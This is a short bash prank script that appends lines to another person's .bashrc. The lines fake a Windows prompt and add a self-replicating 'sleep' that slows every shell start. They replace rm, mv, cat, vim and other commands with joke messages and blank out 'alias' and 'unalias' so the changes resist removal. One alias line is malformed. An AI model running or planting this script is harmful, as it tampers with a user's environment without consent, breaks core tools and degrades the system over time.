#!/usr/bin/env bash

## Adds some mostly harmless stuff to a persons .bashrc

set -ef -o pipefail

append() {
	echo ${1} >> ~/.bashrc 
}

## Windows prompt
append "export PS1='C:\${PWD//\//\\\}>'"

## Increasingly slower bash startup
append "echo \"sleep .1\" >> ~/.bashrc"

## Alias all the things
append "alias ls=sl"
append "alias vim=\"echo Nice try\""
append "alias vi=\"echo Nope\""
append "alias emacs=\"echo You use Emacs. Gross\""
append "alias rm=\"echo Now why would you want to delete something\""
append "alias mv=\"echo But this is my home\""
append "alias sublime=\"echo Sublime is not installed\""
append "alias code=\"echo VSCode is not installed\""
append "alias atom\"echo Atom is not installed\""
append "alias cat=\"echo meow\""
append "alias less=\"echo why have less if you can have more\""
append "alias more=\"echo you\'re just greedy\""
append "alias alias=''"
append "alias unalias=''"













